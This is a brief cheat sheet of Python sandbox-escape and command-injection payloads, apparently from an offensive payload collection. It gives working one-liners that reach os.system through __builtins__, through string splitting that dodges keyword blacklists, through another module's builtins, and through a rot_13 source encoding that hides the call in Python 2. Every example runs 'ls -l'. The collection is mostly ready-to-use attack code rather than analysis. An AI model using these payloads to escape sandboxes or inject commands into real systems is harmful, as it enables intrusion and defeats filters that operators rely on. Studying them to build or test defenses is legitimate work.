# Python code execution (RCE)

> The following tricks can be used when performing Python sandbox escape or Python command injection

## Summary

- [Python sandbox escape](#python-sandbox-escape-trick)


## Python sandbox escape tricks

Import other module via `__builtins__` or `__builtin__` module and `__import__` function
```python
__builtins__.__import__('os').system('ls -l')
```

Access module's attribute using `__dict__` syntax, with this syntax we can bypass some keyword blacklist cases.
```python
__builtins__.__dict__['__import__']('os').system('ls -l')
__builtins__.__dict__['__impo' + 'rt__']('os').__dict__['sys'+'tem']('ls -l')
```

Notice that `__builtins__` dict (same as `__builtins__.__dict__`) can be accessed from any Python module
```python
import re
re.__builtins__['__import__']('os').system('ls -l')
```

RCE using encoding in python file (Python2 only)
```python
# coding: rot_13
# __import__('os').system('ls -l')
__vzcbeg__('os').flfgrz('ls -l')
```

